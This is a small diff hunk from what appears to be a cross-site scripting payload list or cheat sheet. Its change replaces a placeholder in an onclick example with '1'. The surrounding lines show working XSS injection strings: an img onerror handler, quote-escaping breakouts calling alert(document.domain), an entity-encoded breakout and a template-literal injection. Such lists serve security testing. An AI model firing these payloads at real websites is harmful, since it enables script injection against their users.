@@ -15,7 +15,7 @@ a:"/>a"><aa"><img src=x onerror=alert()>
 \';alert(document.domain)//
 \\';alert(document.domain)//
 onerror=alert;throw 1
-<a href="#" onclick="... var input='controllable data here'; ...">
+<a href="#" onclick="... var input='1'; ...">
 &apos;-alert(document.domain)-&apos;
 document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
 ${alert(document.domain)}
